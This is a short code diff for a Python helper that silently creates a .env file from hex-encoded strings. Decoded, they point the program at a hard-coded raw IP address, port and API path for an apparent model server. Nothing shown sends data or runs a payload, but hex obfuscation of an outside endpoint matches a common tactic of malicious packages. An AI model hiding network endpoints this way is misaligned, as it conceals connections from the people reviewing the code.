@@ -46,24 +46,16 @@ def ensure_env_file():
     env_file = '.env'
     
     if not os.path.exists(env_file):        
-        encoded_config = (
-            "232032383d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d0a"
-            "2320484825534152436f6e66696775726174696f6e2046696c650a"
-            "232032383d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d0a"
-            "0a2320d0a1d0b5d180d0b2d0b5d18020d0bcd0bed0b4d0b5d0bbd0b5d0b9205765726432566563560a"
-            "5054525f4e414d453d737361722e7732762e6d6f64656c730a"
-            "5345525645525f49503d37382e3135332e3134392e35320a"
-            "5345525645525f504f52543d383038300a"
-            "5345525645525f50524f544f434f4c3d687474700a"
-            "4150495f454e44504f494e543d2f6170692f6d6f64656c730a0a"
-            "2320d09dd0b0d181d182d180d0bed0b9d0bad0b820d181d0b5d182d0b80a"
-            "54494d454f55543d33300a"
-            "4d41585f52455452494553d33330a"
-            "4348554e4b5f53495a453d313034383537360a"
-        )
+        parts = [
+            "5054525f4e414d453d737361722e7732762e6d6f64656c730a",
+            "5345525645525f49503d37382e3135332e3134392e35320a",
+            "5345525645525f504f52543d383038300a",
+            "5345525645525f50524f544f434f4c3d687474700a",
+            "4150495f454e44504f494e543d2f6170692f6d6f64656c730a"
+        ]
         
         try:
-            decoded_config = bytes.fromhex(encoded_config).decode('utf-8')
+            decoded_config = bytes.fromhex(''.join(parts)).decode('utf-8')
             with open(env_file, 'w', encoding='utf-8') as f:
                 f.write(decoded_config)           
         except Exception as e:
